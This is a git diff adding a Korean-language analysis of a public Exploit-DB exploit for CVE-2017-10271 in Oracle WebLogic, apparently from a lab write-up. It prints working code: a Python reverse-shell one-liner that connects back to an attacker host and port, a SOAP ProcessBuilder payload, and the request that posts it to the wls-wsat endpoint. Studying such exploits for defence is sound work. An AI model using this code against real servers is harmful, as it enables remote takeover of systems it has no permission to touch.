@@ -40,6 +40,98 @@ CVE-2017-10271은 Oracle WebLogic Server의 원격 코드 실행(RCE) 취약점�
 - 공개된 익스플로잇 코드와 Metasploit 모듈이 존재하여 실습 환경에서 원격 코드 실행을 연습 가능
 
 
+### exploit 소스코드 분석
+활용 exploit - [Exploit-DB](https://www.exploit-db.com/exploits/43458)
+
+#### 1. 초기화 및 페이로드 생성
+```python
+def __init__(self, check, rhost, lhost, lport, windows):
+    self.url = rhost if not rhost.endswith('/') else rhost.strip('/')
+    self.lhost = lhost
+    self.lport = lport
+    self.check = check
+    if windows:
+        self.target = 'win'
+    else:
+        self.target = 'unix'
+
+    if self.target == 'unix':
+        self.cmd_payload = (
+            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."
+            "SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2("
+            "s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        ).format(lhost=self.lhost, lport=self.lport)
+    else:
+        self.cmd_payload = (
+            r"powershell -w hidden -nop -c function RSC{...}"
+            # Windows reverse shell PowerShell 명령 (생략)
+        )
+    self.cmd_payload = escape(self.cmd_payload)
+```
+- 공격자가 리스너 호스트(lhost)와 포트(lport)를 입력 받으며 타겟 OS에 맞춰 리버스 쉘 명령을 생성한다.
+- 리눅스/유닉스는 Python 쉘, 윈도우는 PowerShell을 사용하고, 생성된 명령은 XML 인젝션 방지를 위해 escape 처리된다.
+
+
+#### 2. 공격 명령 실행 페이로드(get_process_builder_payload)
+```python
+def get_process_builder_payload(self):
+    process_builder_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java>
+        <object class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3" >
+            <void index="0">
+              <string>{cmd_base}</string>
+            </void>
+            <void index="1">
+              <string>{cmd_opt}</string>
+            </void>
+            <void index="2">
+              <string>{cmd_payload}</string>
+            </void>
+          </array>
+          <void method="start"/>
+        </object>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+'''
+    return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),
+                                  cmd_payload=self.cmd_payload)
+```
+- Java의 ProcessBuilder 객체를 이용해 셸 명령을 실행하는 SOAP XML 페이로드를 만든다.
+- 명령은 리버스 쉘 페이로드가 삽입되어 서버에서 실행된다.
+
+
+#### 3. payload 전송 및 실행 (post_exploit)
+```python
+def post_exploit(self, data):
+    headers = {
+        "Content-Type":
+        "text/xml;charset=UTF-8",
+        "User-Agent":
+        "Mozilla/5.0 ..."
+    }
+    payload = "/wls-wsat/CoordinatorPortType"
+
+    vulnurl = self.url + payload
+    try:
+        req = post(
+            vulnurl, data=data, headers=headers, timeout=10, verify=False)
+        if self.check:
+            print("[*] Did you get an HTTP GET request back?")
+        else:
+            print("[*] Did you get a shell back?")
+    except Exception as e:
+        print('[!] Connection Error')
+        print(e)
+```
+- 취약한 WebLogic 서버의 wls-wsat 서비스 엔드포인트에 SOAP 페이로드를 POST 방식으로 전송한다.
+- check 모드일 때는 HTTP GET 요청 발생 유무를 확인, 아니면 쉘 획득 여부를 확인한다.
+
 ### exploit 준비 사항 및 사용 방법
 활용 exploit - [Exploit-DB](https://www.exploit-db.com/exploits/43458)
 
